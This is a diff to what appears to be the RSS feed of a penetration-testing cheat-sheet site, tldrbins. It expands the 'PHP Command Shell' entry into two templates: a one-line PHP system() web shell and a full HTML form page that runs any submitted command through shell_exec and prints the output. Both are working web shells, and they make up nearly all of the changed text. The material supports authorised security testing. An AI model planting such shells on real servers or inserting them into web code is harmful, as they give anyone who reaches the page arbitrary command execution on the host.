@@ -26,7 +26,7 @@
       <link>https://tldrbins.github.io/php_cmd_shell/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/php_cmd_shell/</guid>
-      <description>PHP Command Shell &amp;lt;?php system($_REQUEST[&amp;#39;cmd&amp;#39;]); ?&amp;gt; </description>
+      <description>Template #1 &amp;lt;?php system($_REQUEST[&amp;#39;cmd&amp;#39;]); ?&amp;gt; Template #2 &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Command Shell&amp;lt;/title&amp;gt; &amp;lt;style&amp;gt; body { font-family: monospace; margin: 20px; } pre { background: #f4f4f4; padding: 10px; } &amp;lt;/style&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form method=&amp;#34;GET&amp;#34; action=&amp;#34;&amp;lt;?php echo htmlspecialchars(basename($_SERVER[&amp;#39;PHP_SELF&amp;#39;])); ?&amp;gt;&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;cmd&amp;#34; autofocus&amp;gt; &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Run&amp;#34;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;pre&amp;gt; &amp;lt;?php if (isset($_GET[&amp;#39;cmd&amp;#39;])) { $cmd = trim($_GET[&amp;#39;cmd&amp;#39;]); if (!empty($cmd)) { echo htmlspecialchars(shell_exec($cmd . &amp;#39; 2&amp;gt;&amp;amp;1&amp;#39;), ENT_QUOTES, &amp;#39;UTF-8&amp;#39;); } } ?&amp;gt; &amp;lt;/pre&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; </description>
     </item>
     <item>
       <title>SMTP</title>
